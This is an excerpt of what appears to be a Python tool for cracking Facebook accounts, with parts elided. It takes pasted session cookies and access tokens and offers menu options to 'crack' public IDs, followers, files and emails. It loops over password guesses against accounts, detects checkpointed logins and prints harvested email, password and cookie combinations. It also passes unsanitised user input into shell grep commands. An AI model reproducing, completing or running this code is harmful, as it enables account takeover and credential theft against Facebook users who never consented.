...
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
XY = random.choice([M2,K2,H2,B2,O2,N2])
balmond = P+"["+O+"*"+P+"]"
###----------[ CHECK THEME COLOR ]---------- ###
try:
...
88      88   YD  `Y88P'  YP    YP         Y888P   `Y88P'  Y8888D'                                                                                                                                                                                                                                       
    ...
    {m}{k}{h}{sir} AUTHOR : PRESHAK BHATTARAI{x}{m}{k}{h}{x}''')
...
def login_lagi334():
	try:
		...
		cookie=input(f'   Input Cookies :{asu} ')
		...
		print(f'  {x}{h}CHECKING COOKIE PLEASE WAIT{x} ')
		...
		print(f'  %s[%sx%s]%s LOGIN FAIL TRY AGAIN!!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	email = "+9779886544291"
	joined = f"{sekarang}"
	expired = "25 OCTOBER 2022"
	akmj.append(nel(f"{P2}[{O2}*{P2}]. User Name  : {my_name} \n[{O2}*{P2}]. User Id    : {my_id} \n[{O2}*{P2}]. Ip address : {ip}",width=40,title=f"{M2}•{K2}•{H2}•{P2} COOKIE OWNER DATA {M2}•{K2}•{M2}•",style=f"{color_table}"))
	akmj.append(nel(f"{P2}[{O2}*{P2}]. Whatsapp    : {email} \n[{O2}*{P2}]. Today Date  : {joined} \n[{O2}*{P2}]. Expiry Date : {expired}\n[{O2}*{P2}]. Status      : {H2}premium{P2}",width=40,title=f"{M2}•{K2}•{H2}•{P2} SC OWNER DETAILS {M2}•{K2}•{M2}•",style=f"{color_table}"))
	console.print(Columns(akmj))
	print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	print('')
	tap = me()
	tap.add_column('NO', style='blue', justify='center')
	tap.add_column('MENU   [PRESHAKK HERE]   ', style='', justify='left', width=55)
	tap.add_column('STATUS', style='green', justify='right')
	tap.add_row('[01]','CRACK PUBLIC ID				 	','[ON]')
	tap.add_row('[02]','CRACK FROM FOLLOWERS',					'[ON]')
	tap.add_row('[03]','REPORT BUG			',					'[ON]')
	tap.add_row('[04]','CRACK FILE [yellow]  UNNIMITED[/yellow]					','[ON]')
	tap.add_row('[05]','CRACK EMAIL','[green][ON][/green]')
	tap.add_row('[06]','SHORT FILES			',					'[ON]')
	tap.add_row('[E]','[red]LOGOUT[/red]','[ON]')
	sol().print(tap, justify='green')

	PRESHAK_JODD = input('\x1b[38;5;196m\x1b[38;5;231m\x1b[38;5;44m [>_] \x1b[38;5;231mInput : ')
	if PRESHAK_JODD in ['1']:
		dump_massal()
	elif PRESHAK_JODD in ['2']:
		dump_pengikut()
	elif PRESHAK_JODD in ['3']:
		laporkan()
	elif PRESHAK_JODD in ['4']:
		crack_file()
	elif PRESHAK_JODD in ['5']:
		clon_email()
	elif PRESHAK_JODD in ['6']:
		os.system("python /sdcard/Samsung/kkk.py")
	elif PRESHAK_JODD in ['7']:
		os.system("python /sdcard/Samsung/run.py")
	elif PRESHAK_JODD in ['8']:
		sort()
	elif PRESHAK_JODD in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> PARAAAA MYAKASSAM ')
		exit()
	else:
		print('°â”€> Correct Input  ')
		back()
def error():
...
class sort:
	def __init__(self):
		...
		link = input ("[?] Link 1 : ")
		link1 = input ("[?] Link 2 : ")
		print("ENTER /sdcard/file.txt")
		os.system('cat /sdcard/jm.txt | grep "'+link+'" > /sdcard/1.txt')
		os.system('cat /sdcard/jm.txt | grep "'+link1+'" >> /sdcard/1.txt')
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/PRESHAK.txt')
		...
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python uff.py")
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('°â”€> [01] Your OK result ')
	print('°â”€> [02] Your CP Results ')
	print('°â”€> [00] EXIT	')
	kz = input('\n>> Input : ')
	if kz in ['2','02']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		print(f' {x}{h} FOLLOW OWNER ID!!!!{x} ')
		print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		os .system ('xdg-open https://www.facebook.com/hacker.ffx8188181');#line:52
...
def laporkan():
       ...
       os .system ('xdg-open https://www.facebook.com/hacker.ffx8188181');back ()#line:52
       back()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f' 1. Old Account ({K}Not Too Recommended{K}{x}){x}')
	...
	#cetak(nel('[cyan][white]°â”€> 3. Mbasic [Recommended] '))
	#cetak(nel('[cyan][white]°â”€> 4. Touch  '))
	#cetak(nel('[cyan][white]°â”€> 5. Mtouch '))
	print('')
	hc = input(' Input : ')
	if hc in ['1','01']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token='+tokenku[0], cookies={'cookie':cok}).json()['birthday']
				m, d, y = ttl.split('/')
				m = tete[m]
				print(f'\r{H}[PRESHAK -OK] EMAIL : {idf} \n PASSWORD : {pw}\n COOKIE :{kuki}')
